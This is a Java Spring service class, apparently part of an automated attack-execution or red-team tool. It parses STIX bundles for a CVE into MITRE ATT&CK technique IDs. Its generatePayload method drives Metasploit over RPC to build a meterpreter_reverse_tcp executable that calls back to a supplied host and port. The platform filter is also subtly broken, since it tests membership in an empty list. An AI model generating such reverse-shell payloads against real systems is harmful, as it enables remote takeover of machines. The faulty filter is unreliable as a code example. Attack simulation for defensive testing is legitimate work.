package com.asimov.executor.service;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import com.asimov.executor.exception.ExecutorCustomException;
import com.asimov.executor.gateway.ExecutorGateway;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.JsonNodeFactory;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.google.common.collect.ImmutableList;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import io.digitalstate.stix.bundle.Bundle;
import io.digitalstate.stix.bundle.BundleObject;
import io.digitalstate.stix.bundle.BundleableObject;
import io.digitalstate.stix.json.StixParserValidationException;
import io.digitalstate.stix.json.StixParsers;
import io.digitalstate.stix.sdo.objects.AttackPattern;

/**
 * executorService
 */
@Service
public class ExecutorService {

        @Autowired
        ExecutorGateway gateway;
        Logger logger = LoggerFactory.getLogger(ExecutorService.class);

        public Bundle retrieveBundle(String cve) throws ExecutorCustomException {
                String response = gateway.retrieveBundle(cve);
                BundleObject bundle = null;
                try {
                        bundle = StixParsers.parseBundle(response);
                } catch (StixParserValidationException | IOException e) {
                        throw new ExecutorCustomException("error for: " + cve, e.getCause());
                }
                return (Bundle) bundle;
        }

        public List<String> retrieveAttacks(Bundle bundle, String targetPlatform) throws ExecutorCustomException {
                ImmutableList<BundleableObject> list = bundle.getObjects().asList();
                List<String> postModules = new ArrayList<>();
                for (BundleableObject bundleableObject : list) {
                        if (bundleableObject instanceof AttackPattern) {
                                AttackPattern attack = null;
                                try {
                                        attack = (AttackPattern) StixParsers
                                                        .parseObject(bundleableObject.toJsonString());
                                        // Object object = attack.getCustomProperties().get("x_mitre_platforms");
                                } catch (StixParserValidationException | IOException e) {
                                        throw new ExecutorCustomException("error parsing attack pattern from bundle",
                                                        e.getCause());
                                }
                                if (targetPlatform == null)
                                        attack.getExternalReferences().forEach(x -> {
                                                if (x.getSourceName().equals("mitre-attack")) {
                                                        postModules.add(x.getExternalId().get());
                                                }
                                        });
                                else
                                        attack.getExternalReferences().forEach(x -> {
                                                if (x.getSourceName().equals("mitre-attack")
                                                                && Arrays.asList().contains(targetPlatform)) {
                                                        postModules.add(x.getExternalId().get());
                                                }
                                        });
                        }
                }
                logger.info("found {} post modules to be executed {} ", postModules.size(), postModules);
                return postModules;
        }

        public String generatePayload(String os, String address, String port) {
                String method = "module.execute";
                ObjectNode node = JsonNodeFactory.instance.objectNode();
                node.put("LHOST", address);
                node.put("LPORT", port);
                node.put("Format", os.contains("linux") ? "elf" : "exe");
                node.put("PayloadUUIDTracking", true);
                node.put("PayloadUUIDName",  UUID.randomUUID().toString());
                Object[] params = new Object[] { "payload", os + "/meterpreter_reverse_tcp", node };
                Map<String, JsonNode> result = gateway.executeCommand(method, params);
                return result.get("payload").asText();
        }

}